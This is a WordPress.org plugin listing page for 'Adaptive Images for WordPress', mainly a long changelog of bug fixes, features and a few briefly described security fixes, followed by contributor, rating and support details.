[Read all 56 reviews](https://wordpress.org/support/plugin/adaptive-images/reviews/)
## Contributors & Developers

“Adaptive Images for WordPress” is open source software. The following people have contributed to this plugin.

Contributors

* ![](https://secure.gravatar.com/avatar/16ee8d63b567a60fc7d0f8ccf798bb2c0cdfcb50d411909a04f79c86ec83f27d?s=32&d=mm&r=g) [Takis Bouyouris](https://profiles.wordpress.org/nevma/)
* ![](https://secure.gravatar.com/avatar/3fb580b63bb290b46b188bafeaad0a6d25e1f48feae9a8f0a6492be2dd94dd7f?s=32&d=mm&r=g) [takisbig](https://profiles.wordpress.org/takisbig/)

[Translate “Adaptive Images for WordPress” into your language.](https://translate.wordpress.org/projects/wp-plugins/adaptive-images)

### Interested in development?

[Browse the code](https://plugins.trac.wordpress.org/browser/adaptive-images/), check out the [SVN repository](https://plugins.svn.wordpress.org/adaptive-images/), or subscribe to the [development log](https://plugins.trac.wordpress.org/log/adaptive-images/) by [RSS](https://plugins.trac.wordpress.org/log/adaptive-images/?limit=100&mode=stop_on_copy&format=rss).

## Changelog

#### 0.6.73

* Ensuring compatibility with WordPress core version 6.6.2.

#### 0.6.72

* Bug fix, htaccess stanza, home url in server root but site url in subdirectory.

#### 0.6.71

* Minor bug fix, validating cache directory path via regular expression.

#### 0.6.70

* Security fix, the cache directory was not sanitized against all cases. Thanks to Austin Turecek for finding the issue!

#### 0.6.69

* Security fix, the REQUEST\_URI was not properly escaped in one case. Thanks to WPScan.com for finding the issue!

#### 0.6.68

* Added SameSite to resolution cookie.

#### 0.6.67

* Security fix, where global request server variable could be exposed to users.

#### 0.6.66

* Fixed minor bug where watched directories needed to be trimeed.
* Updated WordPress compatibility to version 5.2.

#### 0.6.65

* Fixed minor regular expression issue that appeared in PHP 7.3 and caused the cache directory and watched directories to be saved as empty strings.

#### 0.6.64

* Windows path fix (thanks to @minorgod).

#### 0.6.63

* Bug fix when HTTPS was reported as “On” vs “on” in PHP. Now the comparison is case insensitive.
* Bug fix to completely disregard request protocol (HTTP vs HTTPS) when resolving image paths from request urls.

#### 0.6.62

* Bug fix handling decimal device pixel density.
* Bug fix when the wp-content and/or uploads directories have been renamed.
* Bug fix when WordPress installation is in a subdirectory, but the website url remains in the root directory.
* Settings page user interface corrections.

#### 0.6.61

* Added notice for Nginx’s manual configuration.
* Minor bug fixes.

#### 0.6.60

* Removed PNG8 compression for PNGs because it was not peoducing acceptable quality results. PNGs are now simply resized and compressed via normal 32bit PNG compression. In future versions there will be an option to enable and disable PNG8 compression at will and perhaps a way for the plugin to detect in which images it should apply PNG8 compression and in which others to apply 32bit PNG compression.

#### 0.6.51

* Just an update to the plugin version, because 0.6.41 was coming before 0.6.5, due to a lexicographical sorting and was not available as an update in the repository!

#### 0.6.5

* PHP warning in adaptive images script removed.

#### 0.6.42

* Minor bug fix when saving plugin settings.

#### 0.6.41

* Version 0.6.4 bug fix caused a new bug in image path resolution when the WordPress is installed in a subdirectory of the server root directory.

#### 0.6.4

* Fixed bug wp-content dir resolution within the standalone Adaptive Images image handling scrips, where sometimes the server document root was not reported by PHP as being the same as the WordPress installation path.

#### 0.6.3

* Fixed bug in htaccess rewrite rules generation when installation is not in root directory.
* Fixed bug in image delivery script where browser cache was not set correctly in some case.

#### 0.6.2

* Fixed bug where WordPress installation root directory was not calculated correctly in certain cases.

#### 0.6.1

CDN/Varnish compatibility improved. Previously some images were downloaded in both their original and their resized version. Now they are only downloaded once. However if the website is too fast there may be 1-2 images that might manage to download in their original size. We guess that is OK, though.

#### 0.6.0

* Added CDN/Varnish/external caching service support.
* Added Thickbox confirmation dialog on the cache cleanup button in the plugin settings page.
* Added donation button in the plugin settings page.
* Documentation stuff.

#### 0.5.2

* Fixed a bug where the path of the image resizing script was not correctly created in the `.htaccess` file (again).

#### 0.5.1

* Fixed a bug where the path of the image resizing script was not correctly created in the `.htaccess` file.
* Some documentation.

#### 0.5.0

* New option in settings to define whether the plugin should use the bigger dimension of a device as its with or take into account the current orientation. Up to now the plugin used the width of the landscape orientation, which is the biggest of each device's dimensions.
* New option in settings to define whether the plugin should use take special care for HiDPI (retina, high pixel density screens and serve these devices better quality images according to their pixel density.
* Better PNG compression via PNG8. This converts true color PNG images to palette image, which reduces colours and the alpha channel Kudos http://stackoverflow.com/questions/5752514/how-to-convert-png-to-8-bit-png-using-php-gd-library/.
* Fixed some edge cases of not being able to serve a resized image by reverting to original image.
* More analytical settings page debugging and diagnostics.
* Added debugging methods in the image cache generation script.
* Plugin can be configured to respect your default expires headers.
* Some documentation stuff (as always).
* Completely rewritten the script that generates and caches the resized versions of images in order to avoid the GPL vs CC-BY-3.0 licensing incompatibility of the original Adaptive Images script (http://adaptive-images.com/). Plugin is now totally independant and free of any licensing issues.
* Due to the above, the image resizing script is no longer the same, it has been transformed to a new script, named `adaptive-images-script.php` which is in the root folder of the plugin. However the old script is still left inside the plugin folders for compatibility purposes (old versions and users not having saved their settings anew).

#### 0.3.52

* Documentation stuff.

#### 0.3.51

* Minor bug in settings page url parameters.
* Documentation stuff.

#### 0.3.5

* Allow for default browser cache settings.
* More thorough debugging information.
* Added diagnostics debugging in the settings page.
* Nicer admin area user messages with icons.
* Minor fixes here (and there).
* Documentation enhancements.

#### 0.3.04

* Documentation enhancements (yeah).
* Added "noptimize" tag in HEAD Javascript to exclude it from optimizers.

#### 0.3.03

* Added Last-modified HTTP header for resized images, as the best practices do suggest.

#### 0.3.02

* When no device size/resolution is detected then show the original image. Helps avoid misunderstandings and sends search engines the actual images instead of the resized ones.

#### 0.3.01

* Documentation enhancements.

#### 0.3.0

* Almost a complete rewrite of the code.
* Completely updated the settings page to be user friendly.
* Added action in the settings page for cache cleanup.
* Added action in the settings page for debug info.
* Added action in the settings page for cache size calculation.
* Added watched directories field in the settings page anew.
* Divided the plugin files into logical parts.
* Default resolutions changed to 1024, 640 and 480 because the cookie is set based on the max value between screen width and height and most screens have a height between 480 and 640px. Tablets are between 640 and 1024px wide/tall. The iPad is 1024px tall. A screen with a width higher than 1024px is probably not a mobile screen.
* Changed default image cache directory in order to place it inside the expected WordPress `/wp-content/cache` directory, so now by default it is `/wp-content/cache/adaptive-images`.
* Added check for the plugin options.
* Added check for the PHP GD library.
* Added check for the .htaccess file.
* Added upgrade from older versions functions.
* Added upgrade from 0.2.08 to 0.3.0 versions functions.
* Added unistall script `uninstall.php`.
* Documentation enhancements (as usual).

#### 0.2.08

* Added cache size calculation.
* Added cache clean up methods.
* Added nonces to admin actions.
* Documentation enhancements.

#### 0.2.06

* Settings are now separate in an ai-user-settings.php file.

#### 0.2.05

* If the original requested image width and the device screen size are bigger than maximum available breakpoint, then serve the the original image.

#### 0.2.04

* Refactoring code.

#### 0.2.03

* Set the default screen size breakpoints to 1024, 600, 320.

#### 0.2.02

* Refactoring code to separate Adaptive Images files from the other plugin files.

#### 0.2.01

* The first stable version after the initial fork.
* Corrected basic PHP errors.
* Corrected basic WordPress errors.
* Now compatible with version 4.1.1.
* New document root takes into account installations in subdirectories.

#### 0.1

* The version forked from the WP Resolutions plugin https://github.com/JorgenHookham/WP-Resolutions.
* This version does not work with WordPress anymore (at least version 4.1.1 and upwards).

## Meta

* Version **0.6.73**
* Last updated **3 months ago**
* Active installations **5,000+**
* WordPress version **5.0 or higher**
* Tested up to **6.6.2**
* Tags [adaptive images](https://wordpress.org/plugins/tags/adaptive-images/)[mobile images](https://wordpress.org/plugins/tags/mobile-images/)[optimize images](https://wordpress.org/plugins/tags/optimize-images/)[resize images](https://wordpress.org/plugins/tags/resize-images/)[responsive images](https://wordpress.org/plugins/tags/responsive-images/)
* [Advanced View](https://wordpress.org/plugins/adaptive-images/advanced/)

## Ratings

4.7 out of 5 stars.

* [47 5-star reviews
  5 stars

  47](https://wordpress.org/support/plugin/adaptive-images/reviews/?filter=5)
* [5 4-star reviews
  4 stars

  5](https://wordpress.org/support/plugin/adaptive-images/reviews/?filter=4)
* [1 3-star review
  3 stars

  1](https://wordpress.org/support/plugin/adaptive-images/reviews/?filter=3)
* [0 2-star reviews
  2 stars

  0](https://wordpress.org/support/plugin/adaptive-images/reviews/?filter=2)
* [3 1-star reviews
  1 star

  3](https://wordpress.org/support/plugin/adaptive-images/reviews/?filter=1)

[Add my review](https://wordpress.org/support/plugin/adaptive-images/reviews/#new-post)

[See all reviews](https://wordpress.org/support/plugin/adaptive-images/reviews/)

## Contributors

* ![](https://secure.gravatar.com/avatar/16ee8d63b567a60fc7d0f8ccf798bb2c0cdfcb50d411909a04f79c86ec83f27d?s=32&d=mm&r=g) [Takis Bouyouris](https://profiles.wordpress.org/nevma/)
* ![](https://secure.gravatar.com/avatar/3fb580b63bb290b46b188bafeaad0a6d25e1f48feae9a8f0a6492be2dd94dd7f?s=32&d=mm&r=g) [takisbig](https://profiles.wordpress.org/takisbig/)
## Support

Got something to say? Need help?

[View support forum](https://wordpress.org/support/plugin/adaptive-images/)

## Donate

Would you like to support the advancement of this plugin?

[Donate to this plugin](https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=WCES7V9D45HDS)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Privacy](https://wordpress.org/about/privacy/)

* [Showcase](https://wordpress.org/showcase/)
* [Themes](https://wordpress.org/themes/)
* [Plugins](https://wordpress.org/plugins/)
* [Patterns](https://wordpress.org/patterns/)

* [Learn](https://learn.wordpress.org/)
* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [WordPress.tv ↗](https://wordpress.tv/)

* [Get Involved](https://make.wordpress.org/)
* [Events](https://events.wordpress.org/)
* [Donate ↗](https://wordpressfoundation.org/donate/)
* [Five for the Future](https://wordpress.org/five-for-the-future/)

* [WordPress.com ↗](https://wordpress.com/?ref=wporg-footer)
* [Matt ↗](https://ma.tt/)
* [bbPress ↗](https://bbpress.org/)
* [BuddyPress ↗](https://buddypress.org/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our X (formerly Twitter) account](https://www.x.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)
* [Visit our YouTube channel](https://www.youtube.com/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)


